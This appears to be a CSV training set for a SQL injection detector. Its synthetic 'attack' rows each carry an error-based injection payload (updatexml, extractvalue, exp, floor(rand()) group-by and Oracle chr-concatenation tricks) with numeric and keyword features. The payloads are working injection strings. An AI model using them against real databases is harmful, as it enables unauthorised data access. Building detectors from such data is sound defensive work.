id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000147,attack,error,-8057'   )    )    as gpue where 4205  =  4205 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,nearest_attack_euclidean,R000079,0.15893042493553045,374.1648831280954,34.488651083746056,3.3916023192363567,83.46595325123818,56.0,171.95460433498425,62.744325541873025,0.22301744182867578,0.14971334225973046,0.459546043219609,0.16772317269198472,1.0,0.0,3.0,0.0,0.0,3.0,0.0,33.744325541873025,0.0,0.0,0.0,26.0,1.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000148,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'eugs'  =  'eugs",nearest_attack_euclidean,R000037,0.3404783555809642,189.84278847566807,27.415721152433193,3.556151067847379,44.0,39.0,79.67423078053446,27.168557695133615,0.23192843195513796,0.2055729283238723,0.4194265275645236,0.14307211215646612,4.0,0.0,0.0,0.0,0.0,2.0,0.0,15.168557695133615,0.0,0.0,6.0,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000149,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'rvwk'  =  'rvwk",nearest_attack_euclidean,R000214,1.2946261668127632,385.6082295267879,35.46853388765988,3.5870136308620695,104.50345779744188,50.06293222468024,165.66424615658437,65.37759334808142,0.2712560479241728,0.13059419686074325,0.42867889444257273,0.1694708607725112,4.0,0.0,0.0,0.0,0.0,2.531466112340118,0.0,34.25172889872094,0.0,0.0,0.46853388765988235,25.72026278638082,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.531466112340118,0.0,0.0,1.531466112340118,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,7.062932224680236
SMOTE_000150,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu",nearest_attack_euclidean,R000020,0.08056938304579875,185.0,29.66018349049068,3.637216000131582,48.0,35.0,77.0,25.0,0.2594594594594595,0.1891891891891892,0.41621621621621624,0.13513513513513514,4.0,0.0,0.0,0.0,0.0,2.0,0.0,14.0,0.0,0.0,5.0,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000151,attack,error,1 where 8214  =  8214 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,nearest_attack_euclidean,R000120,0.08658148677511804,354.50766800289534,30.06345850036192,3.322065970842117,80.15864625090481,53.09518775054288,162.19037550108575,59.06345850036192,0.22610740061527462,0.14976935455442608,0.45751374798377853,0.1666094968465208,0.0,0.0,2.0317292501809603,0.0,0.0,3.0,0.0,32.03172925018096,0.0,0.0,0.0,25.03172925018096,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.9682707498190394,0.031729250180960566,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000152,attack,error,"-1272' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000183,0.046723503688042595,201.02884725356733,38.08654176070203,3.880106541597969,63.0,37.0,79.0,22.028847253567346,0.3133880750461863,0.18405331391601418,0.3929786972801384,0.10957991375766107,1.0,0.0,1.0,0.0,1.0,1.0,0.0,14.0,0.02884725356734441,0.0,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000153,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",nearest_attack_euclidean,R000210,0.7686706885444305,295.00466738248065,36.435188468041794,3.9607027290832413,101.26391351031347,55.0,107.87037693608359,30.87037693608359,0.3429555746888598,0.18662270897833605,0.3658467544512373,0.10457496188156684,0.8703769360835898,0.0,0.0,0.0,2.0,1.0,0.0,20.0,0.0,0.0,6.0,4.0,0.2175942340208975,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,0.2175942340208975,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.217594234020897
SMOTE_000154,attack,error,"1""  )   as eibf where 5026  =  5026 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",nearest_attack_euclidean,R000040,1.086707735135455,357.6437820515955,34.7011818911236,3.6274849754219995,97.24141826934832,53.0,148.32189102579775,59.08047275644944,0.2718431484331168,0.1482661188622321,0.4146770448056966,0.16521368789895446,0.0,0.5402363782247208,2.0,0.0,0.0,3.0,0.0,29.54023637822472,0.0,3.0,0.0,25.0,0.0,0.5402363782247208,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000155,attack,error,"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # mpyu",nearest_attack_euclidean,R000257,1.1725309113593414,176.0,29.39556019290843,3.532848540165517,46.79112038581686,32.0,74.90665971063736,22.302219903545787,0.2658586385557776,0.18181818181818182,0.4256060210831668,0.12671715854287377,0.3022199035457849,0.0,0.0,0.0,1.0,1.0,0.0,14.302219903545785,0.0,0.0,4.0,2.0,0.3022199035457849,0.0,0.0,0.6977800964542151,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,6.0
SMOTE_000156,attack,error,"1'||  (  select 'qrle' from dual where 9239  =  9239 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000212,0.579442216031965,228.2407988675783,35.0,3.822386017636628,66.24079886757828,40.0,90.0,32.0,0.29022081928575194,0.17525411869487606,0.3943217670634711,0.14020329495590084,4.0,0.0,0.0,0.0,1.0,2.0,0.0,16.0,0.0,0.0,4.0,7.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,0.0,1.0,2.0,0.2407988675782773,0.7592011324217227,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,9.0
SMOTE_000157,attack,error,"1"" where 4066  =  4066 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000306,0.4487686505725585,161.80325743397944,30.803257433979446,3.8827330373879847,39.0,47.0,54.99999999999999,20.803257433979446,0.24103492677228747,0.29047798867429514,0.33992105057630284,0.12856603397711455,0.0,0.8032574339794449,2.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,6.0,4.0,0.0,0.803257433979445,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000158,attack,error,"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000136,0.48628531951719445,151.37539731041332,26.199335062443602,3.5876743484607374,37.598005187330806,36.59468049954882,59.385371373759256,17.79734024977441,0.24977835506792295,0.24196190477557417,0.39060952370122015,0.11765021645528273,0.0,0.0,0.0,0.0,0.0,1.1993350624436028,0.0,11.598005187330807,0.0,0.0,5.0,1.1993350624436037,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1993350624436028,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,3.1993350624436028
SMOTE_000159,attack,error,"1""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""mhfc""  =  ""mhfc",nearest_attack_euclidean,R000205,0.5474263283550379,177.1129751090442,28.407252074246315,3.6598811382182594,46.11087811136947,36.18549585150737,70.33473133178316,24.48186981438421,0.2617507413222478,0.204444516856874,0.39583265446680604,0.13797208735407213,0.0,4.0,0.0,0.0,0.0,2.0,0.0,13.18549585150737,0.0,0.0,5.296373962876843,2.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000160,attack,error,"-5294%""  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000177,0.22776491379157246,423.74422479430143,34.914741598100484,3.44690436721225,103.08525840189951,53.74422479430146,191.0,75.91474159810049,0.24327462918809856,0.12682832414899128,0.45074537861498015,0.17915166804792998,0.0,4.0,0.9147415981004872,0.0,0.0,3.0,0.0,40.0,2.0,0.0,0.0,29.914741598100488,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,1.0852584018995128,0.9147415981004873,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,8.0
SMOTE_000161,attack,error,"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""pnub""  =  ""pnub",nearest_attack_euclidean,R000125,0.7699815704982659,191.81864679093235,29.181353209067638,3.598255203590399,52.089824154491154,32.81864679093236,80.63729358186472,26.27288226364412,0.27168320523553363,0.17105210880763874,0.4203068488598398,0.1369578370969878,0.0,4.0,0.0,0.0,0.7271177363558794,2.0,0.0,14.545764527288242,0.0,0.0,4.272882263644121,2.727117736355879,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.4542354727117583,0.0,0.0,0.7271177363558793,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,6.1813532090676375
SMOTE_000162,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'rxxb'  =  'rxxb",nearest_attack_euclidean,R000034,0.5606572165752941,220.385451749219,31.0,3.841486272078833,75.61454825078101,37.0,82.07817762382848,25.692725874609494,0.34334894860964293,0.16791861857620535,0.37222225091386396,0.11651018190028774,4.0,0.0,0.0,0.0,0.0,2.0,0.0,14.346362937304747,0.34636293730474677,0.0,5.0,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,5.0
SMOTE_000163,attack,error,1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'xazf'  =  'xazf,nearest_attack_euclidean,R000244,0.13910488112288313,364.8327453220975,31.09252725801083,3.3299331321514387,86.13879088701624,45.13879088701625,170.46263629005415,63.09252725801083,0.23611201732620052,0.12372019981142862,0.46722594287456953,0.17294183998780133,4.0,0.0,0.04626362900541514,0.0,0.0,2.953736370994585,0.0,34.09252725801083,0.0,0.0,0.0,23.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.9537363709945845,0.04626362900541531,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000164,attack,error,"1""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""dzse""  =  ""dzse",nearest_attack_euclidean,R000095,0.44809492565907544,195.18021667818655,27.505807147794236,3.4777383210109303,48.18021667818655,34.494192852205764,85.33720476519616,27.16860238259808,0.24671723474620258,0.17683658587452913,0.4372493026312304,0.1391968767480379,0.0,4.0,0.0,0.0,0.16860238259807875,2.0,0.0,16.0,0.0,0.0,4.8313976174019215,2.1686023825980776,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.3372047651961572,0.0,0.0,0.1686023825980787,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.505807147794236
SMOTE_000165,attack,error,"1'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  'dtym'  =  'dtym",nearest_attack_euclidean,R000263,0.3908375393566259,174.50808158559045,27.701616317118088,3.731527276327167,45.93548842282412,39.0,65.3387210570603,24.23387210570603,0.2632240724690736,0.22376862284355065,0.3740461598712542,0.13896114481612148,4.0,0.0,0.0,0.0,0.0,1.7661278942939702,0.0,12.46774421141206,0.0,0.0,6.0,1.7661278942939695,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000166,attack,error,"-9180"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000113,0.4395964210816294,206.88938139046058,40.0,3.8645958805034066,63.0,37.0,83.90781782538383,22.98156356507677,0.30476651887045947,0.17898986028900002,0.4052089377772117,0.11103468306332884,0.0,1.0,1.0,0.0,1.0,1.0,0.0,14.981563565076767,0.0,0.0,3.0,3.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000167,attack,error, (  select   (  case when   (  6461  =  1802  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,nearest_attack_euclidean,R000103,0.4525298711721585,136.97564285375026,27.585385712250158,3.543171690981869,56.0,11.195128570750054,57.3902571415001,12.390257141500104,0.4089155194091565,0.08170658188520831,0.4189853634011394,0.09039253530449579,0.19512857075005274,0.0,0.0,1.0000000000000002,0.0,1.0,0.0,10.0,0.0,0.0,0.19512857075005297,2.0,0.19512857075005285,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,7.0
SMOTE_000168,attack,error,"-2852%'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000302,0.10726868827043436,206.9294598364898,40.85891967297962,3.8988976302496496,63.0,37.0,83.0,23.92945983648981,0.3044520432977145,0.1788051682859593,0.40110348561444925,0.11563930280187691,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.0,0.9294598364898099,0.0,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000169,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""oxvw""  =  ""oxvw",nearest_attack_euclidean,R000024,0.09083038061185959,213.72638618830777,30.0,3.432944571693504,54.0,32.0,97.93865515692315,29.78773103138463,0.25283757812812324,0.14982967592777674,0.45797878061843433,0.13935396532566569,0.0,4.0,0.0,0.0,1.0,2.0,0.0,17.787731031384627,0.0,0.0,4.0,3.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,7.0
SMOTE_000170,attack,error,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000242,1.083474983563854,182.88615606547907,27.99367533697106,3.664027465636774,44.94940269576847,38.503162331514474,72.1914968669823,27.242094171213825,0.2408608533532559,0.216429144563258,0.391785427718371,0.15092457436511508,0.0,4.0,0.0,0.0,0.0,2.0,0.0,13.490513005456588,2.0,0.0,5.751581165757235,2.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.7515811657572353,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.24841883424276479,0.24841883424276479,4.248418834242765
SMOTE_000171,attack,error,"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""oyfk""  =  ""oyfk",nearest_attack_euclidean,R000239,0.18127204184521362,198.47682920209678,30.0,3.5827453905311746,54.0,32.0,84.98146336167741,27.495365840419353,0.27220575715888556,0.16130711535341366,0.42798546521618974,0.13850166227151106,0.0,4.0,0.0,0.0,1.0,2.0,0.0,15.495365840419353,0.0,0.0,4.0,3.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,7.0
